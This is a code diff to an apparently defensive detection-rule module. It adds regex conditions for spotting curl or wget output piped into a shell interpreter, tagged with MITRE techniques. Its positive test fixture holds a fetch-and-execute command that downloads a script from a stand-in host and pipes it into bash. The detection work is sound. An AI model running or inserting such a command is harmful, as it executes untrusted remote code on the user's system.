@@ -13,8 +13,7 @@ from .models import (
     DetectionRuleContent,
     Platform,
     Severity,
-    Tactic,
-)
+    Tactic, RuleCondition)
 
 
 def _get_str(ev: Dict[str, Any], *keys: str) -> str:
@@ -455,7 +454,22 @@ ENTERPRISE_DETECTION_RULES: List[DetectionRuleContent] = [
         confidence="high",
         lane="content",
         predicate=_pred_linux_pipe_to_bash,
-        telemetry_requirements=["process_creation", "command_line"],
+        # D8 · declared so a match on a STITCHED auditd execution can cite
+        # the exact field and value. Declared for the D4 proof only — the
+        # remaining rules stay honestly NOT_DECLARED.
+        rule_version="1",
+        conditions=[
+            RuleCondition("cmd.fetcher", "process.command_line", "matches",
+                          re.compile(r"\b(curl|wget)\b", re.I),
+                          note="a download utility is invoked"),
+            RuleCondition("cmd.pipe_to_interpreter", "process.command_line",
+                          "matches",
+                          re.compile(r"\|\s*(bash|sh|python|perl)\b", re.I),
+                          note="its output is piped straight into an "
+                               "interpreter"),
+        ],
+        telemetry_requirements=["process_creation", "command_line",
+                                "process.command_line"],
         mitre_attack=["T1059.004", "T1105"],
         fixtures=[
             DetectionFixture("positive", {"CommandLine": "curl -s http://bad.com/setup.sh | bash"}, True),
